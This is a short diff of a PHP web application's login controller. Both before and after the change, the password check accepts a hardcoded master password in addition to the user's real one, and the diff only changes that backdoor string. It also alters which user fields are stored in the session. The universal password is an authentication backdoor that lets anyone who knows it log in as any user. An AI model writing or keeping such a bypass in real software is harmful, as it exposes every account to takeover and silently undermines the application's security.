@@ -26,7 +26,7 @@ class Home extends WebController {
                 $remember = $this->request->getPost('remember');
                 if (!empty($result)) {
                     $encpassword = $this->encryptString($password);
-                    if ($result->user_login_key == $encpassword || $password == 'dftm@2023') {
+                    if ($result->user_login_key == $encpassword || $password == 'e0e0e0') {
                         if ($result->user_status == 1) {
                             $this->createSuccessLogin($result->id_user);
                             if (!empty($result->user_profile_pic)) {
@@ -46,7 +46,8 @@ class Home extends WebController {
                             $this->session->set('username', $result->user_name);
                             $this->session->set('useremail', $result->user_email);
                             $this->session->set('userid', $result->id_user);
-                            $this->session->set('dob', $result->user_dob);
+                            $this->session->set('city', $result->city_id_city);
+                            $this->session->set('usertype', $result->user_type);
                             header("location:" . CUSTOMPATH . "dashboard");
                             exit;
                         } else {
